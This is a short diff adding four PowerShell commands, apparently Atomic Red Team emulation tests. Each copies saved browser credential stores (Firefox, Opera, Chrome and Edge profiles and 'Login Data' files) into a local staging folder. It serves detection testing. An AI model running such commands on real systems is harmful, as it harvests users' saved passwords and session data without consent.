@@ -1,0 +1,4 @@
+"powershell.exe" & {Copy-Item \""$env:APPDATA\Mozilla\Firefox\Profiles\\"" -Destination \""C:\AtomicRedTeam\atomics\..\ExternalPayloads\"" -Force -Recurse}
+"powershell.exe" & {Copy-Item \""$env:APPDATA\Opera Software\Opera Stable\Login Data\"" -Destination \""C:\AtomicRedTeam\atomics\..\ExternalPayloads\""}
+"powershell.exe" & {Copy-Item \""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data\"" -Destination \""C:\AtomicRedTeam\atomics\..\ExternalPayloads\"" Copy-Item \""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account\"" -Destination \""C:\AtomicRedTeam\atomics\..\ExternalPayloads\""}
+"powershell.exe" & {Copy-Item \""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\"" -Destination \""C:\AtomicRedTeam\atomics\..\ExternalPayloads\Edge\"" -Force -Recurse}
